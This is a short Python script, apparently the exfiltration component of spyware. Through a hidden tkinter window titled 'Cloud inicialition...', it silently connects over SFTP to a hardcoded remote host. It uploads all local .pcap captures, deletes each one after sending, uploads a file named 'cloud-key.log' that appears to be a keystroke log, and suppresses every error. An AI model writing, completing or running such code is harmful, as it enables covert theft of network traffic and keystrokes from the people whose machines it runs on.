import paramiko
import os
import tkinter as tk
import time

def scp():
    man = 'ip_address'
    toc = 12345
    id_user = 'user'
    psw = 'password'
    file_snd = '/home/user'

    while True:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(man, port=toc, username=id_user, password=psw)
            sftp = ssh.open_sftp()

            pcap_files = [f for f in os.listdir() if f.endswith('.pcap')]
            log_file = 'cloud-key.log'

            if pcap_files:
                for pcap in pcap_files:
                    if os.path.exists(pcap):
                        path = f'{file_snd}/{os.path.basename(pcap)}'
                        sftp.put(pcap, path)
                        os.remove(pcap)
                        time.sleep(5)
                
            if os.path.exists(log_file):
                log_path = f'{file_snd}/{os.path.basename(log_file)}'
                sftp.put(log_file, log_path)
                
            sftp.close()
            ssh.close()
            break

        except Exception as e:
            break

def env():
    win = tk.Tk()
    win.title('Cloud inicialition...')
    win.geometry('400x200')
    win.withdraw()
    scp()
    win.destroy()